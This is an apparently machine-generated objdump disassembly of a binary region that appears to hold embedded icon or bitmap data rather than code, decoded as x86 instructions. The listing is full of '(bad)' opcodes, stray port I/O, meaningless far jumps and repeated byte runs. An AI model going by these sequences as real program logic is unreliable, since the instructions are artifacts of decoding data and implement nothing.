  401691:	60                   	pusha
  401692:	ba de 00 80 c8       	mov    $0xc88000de,%edx
  401697:	e6 00                	out    %al,$0x0
  401699:	8e ce                	mov    %esi,%cs
  40169b:	e8 00 be e4 f2       	call   0xf324d4a0
  4016a0:	00 ce                	add    %cl,%dh
  4016a2:	ea f4 00 fe fe fe 00 	ljmp   $0xfe,$0xfefe00f4
  4016a9:	00 7e b0             	add    %bh,-0x50(%esi)
  4016ac:	00 10                	add    %dl,(%eax)
  4016ae:	98                   	cwtl
  4016af:	ce                   	into
  4016b0:	00 ea                	add    %ch,%dl
  4016b2:	f6 fc                	idiv   %ah
  4016b4:	00 fa                	add    %bh,%dl
  4016b6:	fc                   	cld
  4016b7:	fe 00                	incb   (%eax)
  4016b9:	e2 fc                	loop   0x4016b7
  4016bb:	fe 00                	incb   (%eax)
	...
  4017e5:	ec                   	in     (%dx),%al
  4017e6:	ab                   	stos   %eax,%es:(%edi)
  4017e7:	91                   	xchg   %eax,%ecx
	...
  401814:	b0 ea                	mov    $0xea,%al
  401816:	c7                   	(bad)
  401817:	de f1                	fdivp  %st,%st(1)
  401819:	72 c9                	jb     0x4017e4
  40181b:	d7                   	xlat   %ds:(%ebx)
  40181c:	b8 00 00 00 00       	mov    $0x0,%eax
	...
  401841:	00 00                	add    %al,(%eax)
  401843:	03 d8                	add    %eax,%ebx
  401845:	7e e0                	jle    0x401827
  401847:	e0 e6                	loopne 0x40182f
  401849:	bf e8 d5 f1 10       	mov    $0x10f1d5e8,%edi
  40184e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40184f:	af                   	scas   %es:(%edi),%eax
  401850:	95                   	xchg   %eax,%ebp
	...
  401871:	00 00                	add    %al,(%eax)
  401873:	05 d8 7e da da       	add    $0xdada7ed8,%eax
  401878:	da da                	fcmovu %st(2),%st
  40187a:	da da                	fcmovu %st(2),%st
  40187c:	da e1                	(bad)
  40187e:	e2 ce                	loop   0x40184e
  401880:	7f ef                	jg     0x401871
  401882:	ec                   	in     (%dx),%al
  401883:	8a cf                	mov    %bh,%cl
	...
  4018a1:	00 00                	add    %al,(%eax)
  4018a3:	05 a7 d9 cb cb       	add    $0xcbcbd9a7,%eax
  4018a8:	cb                   	lret
  4018a9:	cb                   	lret
  4018aa:	cb                   	lret
  4018ab:	cb                   	lret
  4018ac:	cb                   	lret
  4018ad:	cb                   	lret
  4018ae:	cb                   	lret
  4018af:	cb                   	lret
  4018b0:	cb                   	lret
  4018b1:	db dc                	fcmovnu %st(4),%st
  4018b3:	c7                   	(bad)
  4018b4:	de f1                	fdivp  %st,%st(1)
  4018b6:	72 ab                	jb     0x401863
  4018b8:	91                   	xchg   %eax,%ecx
  4018b9:	b8 00 00 00 00       	mov    $0x0,%eax
	...
  4018d2:	00 05 de c3 d1 d1    	add    %al,0xd1d1c3de
  4018d8:	d1 d1                	rcl    $1,%ecx
  4018da:	d1 d1                	rcl    $1,%ecx
  4018dc:	d1 d1                	rcl    $1,%ecx
  4018de:	d1 d1                	rcl    $1,%ecx
  4018e0:	d1 d1                	rcl    $1,%ecx
  4018e2:	d1 d1                	rcl    $1,%ecx
  4018e4:	d1 d2                	rcl    $1,%edx
  4018e6:	d3 d4                	rcl    %cl,%esp
  4018e8:	d5 f1                	aad    $0xf1
  4018ea:	10 c9                	adc    %cl,%cl
  4018ec:	d7                   	xlat   %ds:(%ebx)
  4018ed:	95                   	xchg   %eax,%ebp
	...
  401902:	00 ef                	add    %ch,%bh
  401904:	f1                   	int1
  401905:	c3                   	ret
  401906:	ca ca ca             	lret   $0xcaca
  401909:	ca ca ca             	lret   $0xcaca
  40190c:	ca ca ca             	lret   $0xcaca
  40190f:	ca ca ca             	lret   $0xcaca
  401912:	ca ca ca             	lret   $0xcaca
  401915:	ca ca ca             	lret   $0xcaca
  401918:	ca cb e1             	lret   $0xe1cb
  40191b:	cd ce                	int    $0xce
  40191d:	f1                   	int1
  40191e:	1a a6 8a cf 00 00    	sbb    0xcf8a(%esi),%ah
	...
  401930:	00 00                	add    %al,(%eax)
  401932:	00 f2                	add    %dh,%dl
  401934:	f1                   	int1
  401935:	c0 c2 c2             	rol    $0xc2,%dl
  401938:	c2 c2 c2             	ret    $0xc2c2
  40193b:	c2 c2 c2             	ret    $0xc2c2
  40193e:	c2 c2 c2             	ret    $0xc2c2
  401941:	c2 c2 c2             	ret    $0xc2c2
  401944:	c2 c2 c2             	ret    $0xc2c2
  401947:	c2 c2 c2             	ret    $0xc2c2
  40194a:	c2 c2 c2             	ret    $0xc2c2
  40194d:	c2 c5 c6             	ret    $0xc6c5
  401950:	76 7f                	jbe    0x4019d1
  401952:	c9                   	leave
	...
  401963:	f1                   	int1
  401964:	f1                   	int1
  401965:	c0 c1 be             	rol    $0xbe,%cl
  401968:	be be be be be       	mov    $0xbebebebe,%esi
  40196d:	be be be be be       	mov    $0xbebebebe,%esi
  401972:	be be be be be       	mov    $0xbebebebe,%esi
  401977:	be be be be be       	mov    $0xbebebebe,%esi
  40197c:	be be be be be       	mov    $0xbebebebe,%esi
  401981:	bf 72 00 00 00       	mov    $0x72,%edi
	...
  401992:	00 f1                	add    %dh,%cl
  401994:	f1                   	int1
  401995:	bc ba bb bb bb       	mov    $0xbbbbbbba,%esp
  40199a:	bb bb bb bb bb       	mov    $0xbbbbbbbb,%ebx
  40199f:	bb bb bb bb bb       	mov    $0xbbbbbbbb,%ebx
  4019a4:	bb bb bb bb bb       	mov    $0xbbbbbbbb,%ebx
  4019a9:	bb bb bb bb bb       	mov    $0xbbbbbbbb,%ebx
  4019ae:	bb bb bb bf 10       	mov    $0x10bfbbbb,%ebx
	...
  4019c3:	b0 7f                	mov    $0x7f,%al
  4019c5:	b5 b6                	mov    $0xb6,%ch
  4019c7:	b7 b7                	mov    $0xb7,%bh
  4019c9:	b7 b7                	mov    $0xb7,%bh
  4019cb:	b7 b7                	mov    $0xb7,%bh
  4019cd:	b7 b7                	mov    $0xb7,%bh
  4019cf:	b7 b7                	mov    $0xb7,%bh
  4019d1:	b7 b7                	mov    $0xb7,%bh
  4019d3:	b7 b7                	mov    $0xb7,%bh
  4019d5:	b7 b7                	mov    $0xb7,%bh
  4019d7:	b7 b7                	mov    $0xb7,%bh
  4019d9:	b7 b7                	mov    $0xb7,%bh
  4019db:	b7 b7                	mov    $0xb7,%bh
  4019dd:	b7 b7                	mov    $0xb7,%bh
  4019df:	b7 b7                	mov    $0xb7,%bh
  4019e1:	e6 f1                	out    %al,$0xf1
	...
  4019f3:	ac                   	lods   %ds:(%esi),%al
  4019f4:	ac                   	lods   %ds:(%esi),%al
  4019f5:	b1 b6                	mov    $0xb6,%cl
  4019f7:	b3 b3                	mov    $0xb3,%bl
  4019f9:	b3 b3                	mov    $0xb3,%bl
  4019fb:	b3 b3                	mov    $0xb3,%bl
  4019fd:	b3 b3                	mov    $0xb3,%bl
  4019ff:	b3 b3                	mov    $0xb3,%bl
  401a01:	b3 b3                	mov    $0xb3,%bl
  401a03:	b3 b3                	mov    $0xb3,%bl
  401a05:	b3 b3                	mov    $0xb3,%bl
  401a07:	b3 b3                	mov    $0xb3,%bl
  401a09:	b3 b3                	mov    $0xb3,%bl
  401a0b:	b3 b3                	mov    $0xb3,%bl
  401a0d:	b3 b3                	mov    $0xb3,%bl
  401a0f:	b3 b3                	mov    $0xb3,%bl
  401a11:	e6 f1                	out    %al,$0xf1
  401a13:	b8 00 00 00 00       	mov    $0x0,%eax
	...
  401a20:	00 00                	add    %al,(%eax)
  401a22:	00 ac ac b1 a8 6a 6a 	add    %ch,0x6a6aa8b1(%esp,%ebp,4)
  401a29:	6a 6a                	push   $0x6a
  401a2b:	6a 6a                	push   $0x6a
  401a2d:	6a 6a                	push   $0x6a
  401a2f:	6a 6a                	push   $0x6a
  401a31:	6a 6a                	push   $0x6a
  401a33:	6a 6a                	push   $0x6a
  401a35:	6a 6a                	push   $0x6a
  401a37:	6a 6a                	push   $0x6a
  401a39:	6a 6a                	push   $0x6a
  401a3b:	6a 6a                	push   $0x6a
  401a3d:	6a 6a                	push   $0x6a
  401a3f:	6a 6a                	push   $0x6a
  401a41:	e6 ae                	out    %al,$0xae
  401a43:	5d                   	pop    %ebp
	...
  401a50:	00 00                	add    %al,(%eax)
  401a52:	00 ac ac ad a8 6a 6a 	add    %ch,0x6a6aa8ad(%esp,%ebp,4)
  401a59:	6a 6a                	push   $0x6a
  401a5b:	6a 6a                	push   $0x6a
  401a5d:	6a 6a                	push   $0x6a
  401a5f:	6a 6a                	push   $0x6a
  401a61:	6a 6a                	push   $0x6a
  401a63:	6a 6a                	push   $0x6a
  401a65:	6a 6a                	push   $0x6a
  401a67:	6a 6a                	push   $0x6a
  401a69:	6a 6a                	push   $0x6a
  401a6b:	6a 6a                	push   $0x6a
  401a6d:	6a 6a                	push   $0x6a
  401a6f:	6a 6a                	push   $0x6a
  401a71:	e6 ae                	out    %al,$0xae
  401a73:	19 00                	sbb    %eax,(%eax)
	...
  401a81:	00 00                	add    %al,(%eax)
  401a83:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401a84:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401a85:	a0 a4 64 64 64       	mov    0x646464a4,%al
  401a8a:	64 64 64 64 64 64 64 	fs fs fs fs fs fs fs fs fs fs fs fs fs fs
  401a91:	64 64 64 64 64 64 64 
  401a98:	64 64 64 64 64 64 64 	fs fs fs fs fs fs fs fs fs out %al,$0xaa
  401a9f:	64 64 e6 aa 
  401aa3:	ab                   	stos   %eax,%es:(%edi)
	...
  401ab0:	00 00                	add    %al,(%eax)
  401ab2:	00 9f 9f a0 a4 64    	add    %bl,0x64a4a09f(%edi)
  401ab8:	64 64 64 64 64 64 64 	fs fs fs fs fs fs fs fs fs fs fs fs fs fs
  401abf:	64 64 64 64 64 64 64 
  401ac6:	64 64 64 64 64 64 64 	fs fs fs fs fs fs fs fs fs fs fs out %al,$0xa5
  401acd:	64 64 64 64 e6 a5 
  401ad3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
	...
  401ae0:	00 00                	add    %al,(%eax)
  401ae2:	10 9a 9a a0 9c 5f    	adc    %bl,0x5f9ca09a(%edx)
  401ae8:	5f                   	pop    %edi
  401ae9:	5f                   	pop    %edi
  401aea:	5f                   	pop    %edi
  401aeb:	5f                   	pop    %edi
  401aec:	5f                   	pop    %edi
  401aed:	5f                   	pop    %edi
  401aee:	5f                   	pop    %edi
  401aef:	5f                   	pop    %edi
  401af0:	5f                   	pop    %edi
  401af1:	5f                   	pop    %edi
  401af2:	5f                   	pop    %edi
  401af3:	5f                   	pop    %edi
  401af4:	5f                   	pop    %edi
  401af5:	5f                   	pop    %edi
  401af6:	5f                   	pop    %edi
  401af7:	5f                   	pop    %edi
  401af8:	5f                   	pop    %edi
  401af9:	5f                   	pop    %edi
  401afa:	5f                   	pop    %edi
  401afb:	5f                   	pop    %edi
  401afc:	5f                   	pop    %edi
  401afd:	5f                   	pop    %edi
  401afe:	5f                   	pop    %edi
  401aff:	5f                   	pop    %edi
  401b00:	5f                   	pop    %edi
  401b01:	e6 a3                	out    %al,$0xa3
  401b03:	72 00                	jb     0x401b05
	...
  401b11:	00 ee                	add    %ch,%dh
  401b13:	9a 9a 30 82 1e 1e 1e 	lcall  $0x1e1e,$0x1e82309a
  401b1a:	1e                   	push   %ds
  401b1b:	1e                   	push   %ds
  401b1c:	1e                   	push   %ds
  401b1d:	1e                   	push   %ds
  401b1e:	1e                   	push   %ds
  401b1f:	1e                   	push   %ds
  401b20:	1e                   	push   %ds
  401b21:	1e                   	push   %ds
  401b22:	1e                   	push   %ds
  401b23:	1e                   	push   %ds
  401b24:	1e                   	push   %ds
  401b25:	1e                   	push   %ds
  401b26:	1e                   	push   %ds
  401b27:	1e                   	push   %ds
  401b28:	1e                   	push   %ds
  401b29:	1e                   	push   %ds
  401b2a:	1e                   	push   %ds
  401b2b:	1e                   	push   %ds
  401b2c:	1e                   	push   %ds
  401b2d:	1e                   	push   %ds
  401b2e:	1e                   	push   %ds
  401b2f:	1e                   	push   %ds
  401b30:	1e                   	push   %ds
  401b31:	e6 9d                	out    %al,$0x9d
  401b33:	1a 00                	sbb    (%eax),%al
	...
  401b41:	00 ee                	add    %ch,%dh
  401b43:	96                   	xchg   %eax,%esi
  401b44:	97                   	xchg   %eax,%edi
  401b45:	8d 36                	lea    (%esi),%esi
  401b47:	1e                   	push   %ds
  401b48:	1e                   	push   %ds
  401b49:	1e                   	push   %ds
  401b4a:	1e                   	push   %ds
  401b4b:	1e                   	push   %ds
  401b4c:	1e                   	push   %ds
  401b4d:	1e                   	push   %ds
  401b4e:	1e                   	push   %ds
  401b4f:	1e                   	push   %ds
  401b50:	1e                   	push   %ds
  401b51:	1e                   	push   %ds
  401b52:	1e                   	push   %ds
  401b53:	1e                   	push   %ds
  401b54:	1e                   	push   %ds
  401b55:	1e                   	push   %ds
  401b56:	1e                   	push   %ds
  401b57:	1e                   	push   %ds
  401b58:	1e                   	push   %ds
  401b59:	1e                   	push   %ds
  401b5a:	1e                   	push   %ds
  401b5b:	1e                   	push   %ds
  401b5c:	1e                   	push   %ds
  401b5d:	1e                   	push   %ds
  401b5e:	1e                   	push   %ds
  401b5f:	1e                   	push   %ds
  401b60:	1e                   	push   %ds
  401b61:	e6 15                	out    %al,$0x15
  401b63:	f1                   	int1
	...
  401b70:	00 00                	add    %al,(%eax)
  401b72:	03 93 87 8d 40 94    	add    -0x6bbf7279(%ebx),%edx
  401b78:	94                   	xchg   %eax,%esp
  401b79:	94                   	xchg   %eax,%esp
  401b7a:	94                   	xchg   %eax,%esp
  401b7b:	94                   	xchg   %eax,%esp
  401b7c:	94                   	xchg   %eax,%esp
  401b7d:	94                   	xchg   %eax,%esp
  401b7e:	94                   	xchg   %eax,%esp
  401b7f:	94                   	xchg   %eax,%esp
  401b80:	94                   	xchg   %eax,%esp
  401b81:	94                   	xchg   %eax,%esp
  401b82:	94                   	xchg   %eax,%esp
  401b83:	94                   	xchg   %eax,%esp
  401b84:	94                   	xchg   %eax,%esp
  401b85:	94                   	xchg   %eax,%esp
  401b86:	94                   	xchg   %eax,%esp
  401b87:	94                   	xchg   %eax,%esp
  401b88:	94                   	xchg   %eax,%esp
  401b89:	94                   	xchg   %eax,%esp
  401b8a:	94                   	xchg   %eax,%esp
  401b8b:	94                   	xchg   %eax,%esp
  401b8c:	94                   	xchg   %eax,%esp
  401b8d:	94                   	xchg   %eax,%esp
  401b8e:	94                   	xchg   %eax,%esp
  401b8f:	94                   	xchg   %eax,%esp
  401b90:	94                   	xchg   %eax,%esp
  401b91:	e6 70                	out    %al,$0x70
  401b93:	de 95 00 00 00 00    	ficoms 0x0(%ebp)
	...
  401ba1:	00 1a                	add    %bl,(%edx)
  401ba3:	86 87 24 29 8e 8e    	xchg   %al,-0x7171d6dc(%edi)
  401ba9:	8e 8e 8e 8e 8e 8e    	mov    -0x71717172(%esi),%cs
  401baf:	8e 8e 8e 8e 8e 8e    	mov    -0x71717172(%esi),%cs
  401bb5:	8e 8e 8e 8e 8e 8e    	mov    -0x71717172(%esi),%cs
  401bbb:	8e 8e 8e 8e 8e 8e    	mov    -0x71717172(%esi),%cs
  401bc1:	e6 8f                	out    %al,$0x8f
  401bc3:	90                   	nop
  401bc4:	5d                   	pop    %ebp
	...
  401bd1:	00 04 86             	add    %al,(%esi,%eax,4)
  401bd4:	87 fc                	xchg   %edi,%esp
  401bd6:	29 70 83             	sub    %esi,-0x7d(%eax)
  401bd9:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  401bdf:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  401be5:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  401beb:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  401bf1:	e6 67                	out    %al,$0x67
  401bf3:	89 8a 00 00 00 00    	mov    %ecx,0x0(%edx)
	...
  401c01:	00 05 7d 74 7f 80    	add    %al,0x807f747d
  401c07:	33 1c 1c             	xor    (%esp,%ebx,1),%ebx
  401c0a:	ff 14 8f             	call   *(%edi,%ecx,4)
  401c0d:	1f                   	pop    %ds
  401c0e:	15 16 16 16 16       	adc    $0x16161616,%eax
  401c13:	16                   	push   %ss
  401c14:	16                   	push   %ss
  401c15:	16                   	push   %ss
  401c16:	16                   	push   %ss
  401c17:	16                   	push   %ss
  401c18:	16                   	push   %ss
  401c19:	16                   	push   %ss
  401c1a:	16                   	push   %ss
  401c1b:	16                   	push   %ss
  401c1c:	16                   	push   %ss
  401c1d:	16                   	push   %ss
  401c1e:	16                   	push   %ss
  401c1f:	16                   	push   %ss
  401c20:	16                   	push   %ss
  401c21:	e6 14                	out    %al,$0x14
  401c23:	84 ab 00 00 00 00    	test   %ch,0x0(%ebx)
	...
  401c31:	00 05 73 74 75 6e    	add    %al,0x6e757473
  401c37:	f1                   	int1
  401c38:	fc                   	cld
  401c39:	24 25                	and    $0x25,%al
  401c3b:	31 32                	xor    %esi,(%edx)
  401c3d:	56                   	push   %esi
  401c3e:	34 34                	xor    $0x34,%al
  401c40:	29 15 7a 7a 7a 7a    	sub    %edx,0x7a7a7a7a
  401c46:	7a 7a                	jp     0x401cc2
  401c48:	7a 7a                	jp     0x401cc4
  401c4a:	7a 7a                	jp     0x401cc6
  401c4c:	7a 7a                	jp     0x401cc8
  401c4e:	7a 7a                	jp     0x401cca
  401c50:	7a e6                	jp     0x401c38
  401c52:	ff                   	(bad)
  401c53:	7b ec                	jnp    0x401c41
	...
  401c61:	00 05 54 69 a9 a9    	add    %al,0xa9a96954
  401c67:	a9 6b 75 6d 6e       	test   $0x6e6d756b,%eax
  401c6c:	ce                   	into
  401c6d:	f1                   	int1
  401c6e:	fc                   	cld
  401c6f:	18 2f                	sbb    %ch,(%edi)
  401c71:	5a                   	pop    %edx
  401c72:	1f                   	pop    %ds
  401c73:	1f                   	pop    %ds
  401c74:	1f                   	pop    %ds
  401c75:	1f                   	pop    %ds
  401c76:	1f                   	pop    %ds
  401c77:	1f                   	pop    %ds
  401c78:	1f                   	pop    %ds
  401c79:	1f                   	pop    %ds
  401c7a:	1f                   	pop    %ds
  401c7b:	1f                   	pop    %ds
  401c7c:	1f                   	pop    %ds
  401c7d:	1f                   	pop    %ds
  401c7e:	1f                   	pop    %ds
  401c7f:	1f                   	pop    %ds
  401c80:	1f                   	pop    %ds
  401c81:	e6 5b                	out    %al,$0x5b
  401c83:	71 72                	jno    0x401cf7
	...
  401c91:	00 ef                	add    %ch,%bh
  401c93:	62 63 64             	bound  %esp,0x64(%ebx)
  401c96:	64 64 64 64 64 64 64 	fs fs fs fs fs fs fs fs gs data16 cld
  401c9d:	64 65 66 fc 
  401ca1:	2f                   	das
  401ca2:	59                   	pop    %ecx
  401ca3:	67 67 67 67 67 67 67 	addr16 addr16 addr16 addr16 addr16 addr16 addr16 addr16 addr16 addr16 addr16 addr16 addr16 addr16
  401caa:	67 67 67 67 67 67 67 
  401cb1:	e6 59                	out    %al,$0x59
  401cb3:	68 ef 00 00 00       	push   $0xef
	...
  401cc0:	00 00                	add    %al,(%eax)
  401cc2:	f1                   	int1
  401cc3:	56                   	push   %esi
  401cc4:	38 1e                	cmp    %bl,(%esi)
  401cc6:	1e                   	push   %ds
  401cc7:	1e                   	push   %ds
  401cc8:	1e                   	push   %ds
  401cc9:	1e                   	push   %ds
  401cca:	1e                   	push   %ds
  401ccb:	1e                   	push   %ds
  401ccc:	1e                   	push   %ds
  401ccd:	1e                   	push   %ds
  401cce:	1e                   	push   %ds
  401ccf:	1e                   	push   %ds
  401cd0:	6d                   	insl   (%dx),%es:(%edi)
  401cd1:	fc                   	cld
  401cd2:	12 28                	adc    (%eax),%ch
  401cd4:	59                   	pop    %ecx
  401cd5:	5a                   	pop    %edx
  401cd6:	5a                   	pop    %edx
  401cd7:	5b                   	pop    %ebx
  401cd8:	61                   	popa
  401cd9:	ff                   	(bad)
  401cda:	ff                   	(bad)
  401cdb:	ff                   	(bad)
  401cdc:	ff                   	(bad)
  401cdd:	ff                   	(bad)
  401cde:	ff                   	(bad)
  401cdf:	ff                   	(bad)
  401ce0:	ff e6                	jmp    *%esi
  401ce2:	28 28                	sub    %ch,(%eax)
  401ce4:	f1                   	int1
	...
  401cf1:	00 f1                	add    %dh,%cl
  401cf3:	20 43 1e             	and    %al,0x1e(%ebx)
  401cf6:	1e                   	push   %ds
  401cf7:	1e                   	push   %ds
  401cf8:	1e                   	push   %ds
  401cf9:	1e                   	push   %ds
  401cfa:	1e                   	push   %ds
  401cfb:	1e                   	push   %ds
  401cfc:	1e                   	push   %ds
  401cfd:	1e                   	push   %ds
  401cfe:	1e                   	push   %ds
  401cff:	1e                   	push   %ds
  401d00:	1e                   	push   %ds
  401d01:	57                   	push   %edi
  401d02:	fc                   	cld
  401d03:	09 50 f7             	or     %edx,-0x9(%eax)
  401d06:	0d 58 fe fe 13       	or     $0x13fefe58,%eax
  401d0b:	28 59 59             	sub    %bl,0x59(%ecx)
  401d0e:	5a                   	pop    %edx
  401d0f:	5a                   	pop    %edx
  401d10:	5a                   	pop    %edx
  401d11:	e6 fe                	out    %al,$0xfe
  401d13:	fe                   	(bad)
  401d14:	fc                   	cld
  401d15:	5d                   	pop    %ebp
	...
  401d22:	f1                   	int1
  401d23:	12 41 1e             	adc    0x1e(%ecx),%al
  401d26:	1e                   	push   %ds
  401d27:	1e                   	push   %ds
  401d28:	1e                   	push   %ds
  401d29:	1e                   	push   %ds
  401d2a:	1e                   	push   %ds
  401d2b:	1e                   	push   %ds
  401d2c:	1e                   	push   %ds
  401d2d:	1e                   	push   %ds
  401d2e:	1e                   	push   %ds
  401d2f:	1e                   	push   %ds
  401d30:	94                   	xchg   %eax,%esp
  401d31:	1e                   	push   %ds
  401d32:	4e                   	dec    %esi
  401d33:	45                   	inc    %ebp
  401d34:	46                   	inc    %esi
  401d35:	47                   	inc    %edi
  401d36:	48                   	dec    %eax
  401d37:	f1                   	int1
  401d38:	f1                   	int1
  401d39:	4b                   	dec    %ebx
  401d3a:	09 f6                	or     %esi,%esi
  401d3c:	51                   	push   %ecx
  401d3d:	f8                   	clc
  401d3e:	1c fa                	sbb    $0xfa,%al
  401d40:	fa                   	cli
  401d41:	62 fa fa             	(bad) {%k1}
  401d44:	09 55 00             	or     %edx,0x0(%ebp)
	...
  401d4f:	00 00                	add    %al,(%eax)
  401d51:	00 07                	add    %al,(%edi)
  401d53:	3d 29 1d 1e 1e       	cmp    $0x1e1e1d29,%eax
  401d58:	1e                   	push   %ds
  401d59:	1e                   	push   %ds
  401d5a:	1e                   	push   %ds
  401d5b:	1e                   	push   %ds
  401d5c:	1e                   	push   %ds
  401d5d:	1e                   	push   %ds
  401d5e:	1e                   	push   %ds
  401d5f:	38 29                	cmp    %ch,(%ecx)
  401d61:	1c 3f                	sbb    $0x3f,%al
  401d63:	35 2d 42 17 1d       	xor    $0x1d17422d,%eax
  401d68:	64 65 45             	fs gs inc %ebp
  401d6b:	46                   	inc    %esi
  401d6c:	47                   	inc    %edi
  401d6d:	48                   	dec    %eax
  401d6e:	f1                   	int1
  401d6f:	f1                   	int1
  401d70:	f4                   	hlt
  401d71:	49                   	dec    %ecx
  401d72:	f6 79 4b             	idivb  0x4b(%ecx)
  401d75:	4c                   	dec    %esp
	...
  401d82:	00 f3                	add    %dh,%bl
  401d84:	20 7a 1e             	and    %bh,0x1e(%edx)
  401d87:	1e                   	push   %ds
  401d88:	1e                   	push   %ds
  401d89:	1e                   	push   %ds
  401d8a:	1e                   	push   %ds
  401d8b:	1e                   	push   %ds
  401d8c:	1e                   	push   %ds
  401d8d:	1e                   	push   %ds
  401d8e:	94                   	xchg   %eax,%esp
  401d8f:	ff 2f                	ljmp   *(%edi)
  401d91:	24 18                	and    $0x18,%al
  401d93:	1b 31                	sbb    (%ecx),%esi
  401d95:	32 33                	xor    (%ebx),%dh
  401d97:	34 34                	xor    $0x34,%al
  401d99:	2a 1f                	sub    (%edi),%bl
  401d9b:	7a 88                	jp     0x401d25
  401d9d:	8e 1e                	mov    (%esi),%ds
  401d9f:	39 65 f1             	cmp    %esp,-0xf(%ebp)
  401da2:	c9                   	leave
  401da3:	ee                   	out    %al,(%dx)
  401da4:	02 00                	add    (%eax),%al
	...
  401db2:	00 f0                	add    %dh,%al
  401db4:	50                   	push   %eax
  401db5:	59                   	pop    %ecx
  401db6:	94                   	xchg   %eax,%esp
  401db7:	1e                   	push   %ds
  401db8:	1e                   	push   %ds
  401db9:	1e                   	push   %ds
  401dba:	1e                   	push   %ds
  401dbb:	1e                   	push   %ds
  401dbc:	1e                   	push   %ds
  401dbd:	1e                   	push   %ds
  401dbe:	8f                   	(bad)
  401dbf:	12 21                	adc    (%ecx),%ah
  401dc1:	22 00                	and    (%eax),%al
  401dc3:	00 ed                	add    %ch,%ch
  401dc5:	ee                   	out    %al,(%dx)
  401dc6:	f0 f0 f3 24 a0       	lock lock repz and $0xa0,%al
  401dcb:	50                   	push   %eax
  401dcc:	26 27                	es daa
  401dce:	28 5a 14             	sub    %bl,0x14(%edx)
  401dd1:	fc                   	cld
	...
  401de2:	00 00                	add    %al,(%eax)
  401de4:	fc                   	cld
  401de5:	fd                   	std
  401de6:	fe                   	(bad)
  401de7:	fe                   	(bad)
  401de8:	ff                   	(bad)
  401de9:	ff 15 7a 17 7a fe    	call   *0xfe7a177a
  401def:	49                   	dec    %ecx
  401df0:	19 00                	sbb    %eax,(%eax)
	...
  401dfa:	00 ee                	add    %ch,%dh
  401dfc:	ed                   	in     (%dx),%eax
  401dfd:	05 05 f1 f1 03       	add    $0x3f1f105,%eax
	...
  401e12:	00 00                	add    %al,(%eax)
  401e14:	f2 f3 f4             	repnz repz hlt
  401e17:	f5                   	cmc
  401e18:	f6 f7                	div    %bh
  401e1a:	f8                   	clc
  401e1b:	f9                   	stc
  401e1c:	01 01                	add    %eax,(%ecx)
  401e1e:	f7 fb                	idiv   %ebx
	...
  401e48:	ed                   	in     (%dx),%eax
  401e49:	ee                   	out    %al,(%dx)
  401e4a:	ef                   	out    %eax,(%dx)
  401e4b:	05 f0 f1 f0 00       	add    $0xf0f1f0,%eax
	...
  401fbc:	00 ff                	add    %bh,%bh
  401fbe:	ff                   	(bad)
  401fbf:	ff                   	(bad)
  401fc0:	ff                   	(bad)
  401fc1:	ff                   	(bad)
  401fc2:	ff 00                	incl   (%eax)
  401fc4:	00 ff                	add    %bh,%bh
  401fc6:	ff                   	(bad)
  401fc7:	ff                   	(bad)
  401fc8:	ff                   	(bad)
  401fc9:	ff                   	(bad)
  401fca:	ff 00                	incl   (%eax)
  401fcc:	00 ff                	add    %bh,%bh
  401fce:	ff                   	(bad)
  401fcf:	ff                   	(bad)
  401fd0:	ff                   	(bad)
  401fd1:	ff                   	(bad)
  401fd2:	ff 00                	incl   (%eax)
  401fd4:	00 ff                	add    %bh,%bh
  401fd6:	ff                   	(bad)
  401fd7:	ff                   	(bad)
  401fd8:	ff                   	(bad)
  401fd9:	ff                   	(bad)
  401fda:	ff 00                	incl   (%eax)
  401fdc:	00 ff                	add    %bh,%bh
  401fde:	ff                   	(bad)
  401fdf:	ff                   	(bad)
  401fe0:	ff                   	(bad)
  401fe1:	ff                   	(bad)
  401fe2:	ff 00                	incl   (%eax)
  401fe4:	00 ff                	add    %bh,%bh
  401fe6:	9f                   	lahf
  401fe7:	ff                   	(bad)
  401fe8:	ff                   	(bad)
  401fe9:	ff                   	(bad)
  401fea:	ff 00                	incl   (%eax)
  401fec:	00 ff                	add    %bh,%bh
  401fee:	01 ff                	add    %edi,%edi
  401ff0:	ff                   	(bad)
  401ff1:	ff                   	(bad)
  401ff2:	ff 00                	incl   (%eax)
  401ff4:	00 fe                	add    %bh,%dh
  401ff6:	00 0f                	add    %cl,(%edi)
  401ff8:	ff                   	(bad)
  401ff9:	ff                   	(bad)
  401ffa:	ff 00                	incl   (%eax)
  401ffc:	00 fc                	add    %bh,%ah
  401ffe:	00 00                	add    %al,(%eax)
  402000:	ff                   	(bad)
  402001:	ff                   	(bad)
  402002:	ff 00                	incl   (%eax)
  402004:	00 fc                	add    %bh,%ah
  402006:	00 00                	add    %al,(%eax)
  402008:	0f ff ff             	ud0    %edi,%edi
  40200b:	00 00                	add    %al,(%eax)
  40200d:	fc                   	cld
  40200e:	00 00                	add    %al,(%eax)
  402010:	00 ff                	add    %bh,%bh
  402012:	ff 00                	incl   (%eax)
  402014:	00 fc                	add    %bh,%ah
  402016:	00 00                	add    %al,(%eax)
  402018:	00 07                	add    %al,(%edi)
  40201a:	ff 00                	incl   (%eax)
  40201c:	00 fc                	add    %bh,%ah
  40201e:	00 00                	add    %al,(%eax)
  402020:	00 01                	add    %al,(%ecx)
  402022:	ff 00                	incl   (%eax)
  402024:	00 fc                	add    %bh,%ah
  402026:	00 00                	add    %al,(%eax)
  402028:	00 01                	add    %al,(%ecx)
  40202a:	ff 00                	incl   (%eax)
  40202c:	00 fc                	add    %bh,%ah
  40202e:	00 00                	add    %al,(%eax)
  402030:	00 01                	add    %al,(%ecx)
  402032:	ff 00                	incl   (%eax)
  402034:	00 fc                	add    %bh,%ah
  402036:	00 00                	add    %al,(%eax)
  402038:	00 01                	add    %al,(%ecx)
  40203a:	ff 00                	incl   (%eax)
  40203c:	00 fc                	add    %bh,%ah
  40203e:	00 00                	add    %al,(%eax)
  402040:	00 01                	add    %al,(%ecx)
  402042:	ff 00                	incl   (%eax)
  402044:	00 fc                	add    %bh,%ah
  402046:	00 00                	add    %al,(%eax)
  402048:	00 01                	add    %al,(%ecx)
  40204a:	ff 00                	incl   (%eax)
  40204c:	00 fc                	add    %bh,%ah
  40204e:	00 00                	add    %al,(%eax)
